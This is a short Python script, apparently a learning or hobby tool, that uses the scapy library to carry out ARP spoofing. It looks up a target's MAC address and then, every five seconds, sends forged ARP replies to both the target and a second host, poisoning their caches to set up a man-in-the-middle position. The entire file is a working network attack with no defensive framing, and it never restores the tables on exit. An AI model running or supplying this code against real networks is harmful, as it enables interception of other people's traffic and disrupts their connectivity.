import scapy.all as scapy

import time
import sys



def get_mac(ip):
    # creating an arp packet using  scapy library
    arp_packet = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_broadcast  = broadcast/arp_packet
    answers = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    # returning the mac address
    return answers[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    # spoof ip is the ip of the machine that the target machine wants arp reply from
    
    target_mac = get_mac(target_ip)  # Get the mac address
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

target_ip = str(input("Enter Target IP >> "))
spoof_ip = str(input("Enter Spoof IP >> "))

try: 
    while True:
        spoof(target_ip, spoof_ip)   
        spoof(spoof_ip, target_ip)   
        print('Packets sent!')
        time.sleep(5)   #
except KeyboardInterrupt:
        print("Exiting.....")
        sys.exit()
